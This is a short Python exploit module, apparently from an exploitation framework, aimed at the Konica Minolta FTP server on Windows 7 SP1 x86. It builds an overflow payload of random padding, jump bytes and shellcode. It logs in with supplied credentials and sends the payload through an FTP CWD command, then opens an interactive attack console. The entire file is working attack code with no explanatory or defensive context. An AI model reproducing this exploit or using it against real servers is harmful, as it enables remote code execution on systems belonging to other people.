import os, sys
sys.path.append(os.path.join(os.path.dirname(__file__), '..', '..', '..'))
import core
class konicaMinoltaCwdOverflowMenu(core.Exploit):
    def generate(self, p):
      p += self.rand(1037)
      p += "\xEB\x06b<\x9Dm \x12"
      p += self.get_shellcode()
      p += self.rand(3000)
    def deliver(self, p):
      self.init_deliver()
      s = self.connect()
      s.send("USER " + self.variables["user"])
      s.recv(1024)
      s.send("PASS " + self.variables["passwd"])
      s.recv(1024)
      s.send("CWD " + p)
      self.disconnect(s)
def main():
  konicaminoltacwdoverflowmenu = konicaMinoltaCwdOverflowMenu("konica_minolta_cwd_overflow", "Windows 7 SP1 x86", "konica_minolta_cwd.shell", {"user":"", "passwd":"", "host":""}, {"user":"the user to login as", "passwd":"the password to use", "host":"the IP of the target"})
  konicaminoltacwdoverflowmenu.cmdloop("pdf-console attack(konica_minolta_cwd_overflow)% ")
if __name__ == '__main__':
  main()
